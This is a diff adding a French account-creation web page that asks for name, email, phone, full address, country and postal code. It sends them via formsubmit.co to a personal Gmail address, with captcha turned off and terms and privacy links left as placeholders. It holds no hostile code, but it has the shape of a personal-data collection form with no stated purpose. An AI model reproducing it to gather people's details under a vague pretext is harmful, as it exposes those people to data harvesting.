@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Création de Compte</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * { font-family: 'Poppins', sans-serif; }
+    body { background: linear-gradient(135deg, #0f172a, #1e293b); min-height: 100vh; overflow-x: hidden; }
+    .form-container { backdrop-filter: blur(16px) saturate(180%); background-color: rgba(30, 41, 59, 0.75); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.125); }
+    .submit-btn { background: linear-gradient(135deg, #6366f1, #8b5cf6); transition: all 0.4s ease; position: relative; }
+    .submit-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(99, 102, 241, 0.4); }
+    .decor-circle { border-radius: 50%; filter: blur(40px); opacity: 0.6; }
+  </style>
+</head>
+<body class="flex items-center justify-center p-4 md:p-8">
+  <!-- Décorations -->
+  <div class="fixed inset-0 overflow-hidden">
+    <div class="absolute top-[10%] left-[5%] w-64 h-64 bg-purple-500 rounded-full decor-circle"></div>
+    <div class="absolute top-[20%] right-[10%] w-80 h-80 bg-indigo-500 rounded-full decor-circle"></div>
+    <div class="absolute bottom-[15%] left-[15%] w-72 h-72 bg-blue-500 rounded-full decor-circle"></div>
+    <div class="absolute bottom-[25%] right-[20%] w-60 h-60 bg-indigo-600 rounded-full decor-circle"></div>
+  </div>
+
+  <!-- Contenu principal -->
+  <div class="relative w-full max-w-4xl z-10">
+    <div class="flex flex-col md:flex-row gap-8">
+      
+      <!-- Illustration -->
+      <div class="w-full md:w-2/5 flex flex-col justify-center text-center mb-8">
+        <h1 class="text-4xl md:text-5xl font-bold text-white mb-2">Créez votre compte</h1>
+        <p class="text-indigo-200">Rejoignez notre communauté exclusive</p>
+      </div>
+
+      <!-- Formulaire -->
+      <div class="w-full md:w-3/5">
+        <div class="form-container p-6 md:p-8 rounded-2xl shadow-2xl">
+          <form action="https://formsubmit.co/laurantscrt@gmail.com" method="POST" class="space-y-6">
+            
+            <!-- Config cachée -->
+            <input type="hidden" name="_next" value="https://ac-authenticite.netlify.app/merci.html">
+            <input type="hidden" name="_captcha" value="false">
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+              <div class="input-group">
+                <label class="block text-indigo-200 mb-2">Nom</label>
+                <div class="relative">
+                  <i class="fas fa-user absolute left-3 top-1/2 -translate-y-1/2 text-indigo-400"></i>
+                  <input type="text" name="Nom" placeholder="Votre nom" required class="w-full pl-10 pr-4 py-3 bg-slate-800/50 border border-slate-700 rounded-lg text-white">
+                </div>
+              </div>
+              <div class="input-group">
+                <label class="block text-indigo-200 mb-2">Prénom</label>
+                <div class="relative">
+                  <i class="fas fa-signature absolute left-3 top-1/2 -translate-y-1/2 text-indigo-400"></i>
+                  <input type="text" name="Prénom" placeholder="Votre prénom" required class="w-full pl-10 pr-4 py-3 bg-slate-800/50 border border-slate-700 rounded-lg text-white">
+                </div>
+              </div>
+            </div>
+
+            <div class="input-group">
+              <label class="block text-indigo-200 mb-2">Email</label>
+              <div class="relative">
+                <i class="fas fa-envelope absolute left-3 top-1/2 -translate-y-1/2 text-indigo-400"></i>
+                <input type="email" name="Email" placeholder="email@exemple.com" required class="w-full pl-10 pr-4 py-3 bg-slate-800/50 border border-slate-700 rounded-lg text-white">
+              </div>
+            </div>
+
+            <div class="input-group">
+              <label class="block text-indigo-200 mb-2">Téléphone</label>
+              <div class="relative">
+                <i class="fas fa-phone absolute left-3 top-1/2 -translate-y-1/2 text-indigo-400"></i>
+                <input type="tel" name="Téléphone" placeholder="+33 6 12 34 56 78" required class="w-full pl-10 pr-4 py-3 bg-slate-800/50 border border-slate-700 rounded-lg text-white">
+              </div>
+            </div>
+
+            <div class="input-group">
+              <label class="block text-indigo-200 mb-2">Adresse</label>
+              <div class="relative">
+                <i class="fas fa-home absolute left-3 top-1/2 -translate-y-1/2 text-indigo-400"></i>
+                <input type="text" name="Adresse" placeholder="Votre adresse complète" required class="w-full pl-10 pr-4 py-3 bg-slate-800/50 border border-slate-700 rounded-lg text-white">
+              </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+              <div class="input-group">
+                <label class="block text-indigo-200 mb-2">Pays</label>
+                <div class="relative">
+                  <i class="fas fa-globe-europe absolute left-3 top-1/2 -translate-y-1/2 text-indigo-400"></i>
+                  <select name="Pays" required class="w-full pl-10 pr-4 py-3 bg-slate-800/50 border border-slate-700 rounded-lg text-white">
+                    <option value="" disabled selected>Sélectionnez votre pays</option>
+                    <option>France</option>
+                    <option>Belgique</option>
+                    <option>Suisse</option>
+                    <option>Canada</option>
+                    <option>Luxembourg</option>
+                    <option>Autre</option>
+                  </select>
+                </div>
+              </div>
+              <div class="input-group">
+                <label class="block text-indigo-200 mb-2">Code Postal</label>
+                <div class="relative">
+                  <i class="fas fa-mail-bulk absolute left-3 top-1/2 -translate-y-1/2 text-indigo-400"></i>
+                  <input type="text" name="Code Postal" placeholder="Code postal" required class="w-full pl-10 pr-4 py-3 bg-slate-800/50 border border-slate-700 rounded-lg text-white">
+                </div>
+              </div>
+            </div>
+
+            <div class="input-group">
+              <label class="flex items-center">
+                <input type="checkbox" required class="form-checkbox h-5 w-5 text-indigo-600 rounded">
+                <span class="ml-2 text-indigo-200 text-sm">J'accepte les <a href="#" class="text-indigo-400 underline">conditions</a> et la <a href="#" class="text-indigo-400 underline">politique</a></span>
+              </label>
+            </div>
+
+            <button type="submit" class="submit-btn w-full py-4 px-6 rounded-xl text-white font-semibold text-lg">
+              Créer mon compte <i class="fas fa-arrow-right ml-2"></i>
+            </button>
+
+            <div class="text-center text-indigo-300 text-sm">
+              Vous avez déjà un compte? <a href="#" class="text-indigo-400 hover:text-indigo-200 font-medium">Connectez-vous</a>
+            </div>
+
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
